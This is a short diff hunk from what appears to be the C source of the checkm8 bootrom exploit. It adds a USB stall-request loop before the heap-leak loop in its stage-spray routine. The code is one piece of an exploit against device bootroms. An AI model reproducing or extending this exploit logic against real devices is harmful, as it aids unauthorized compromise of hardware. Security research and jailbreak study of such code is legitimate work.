@@ -946,6 +946,7 @@ checkm8_stage_spray(const usb_handle_t *handle) {
 		}
 		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
 	} else {
+		while(!checkm8_usb_request_stall(handle)) {}
 		for(i = 0; i < config_large_leak; ++i) {
 			while(!checkm8_usb_request_leak(handle)) {}
 		}
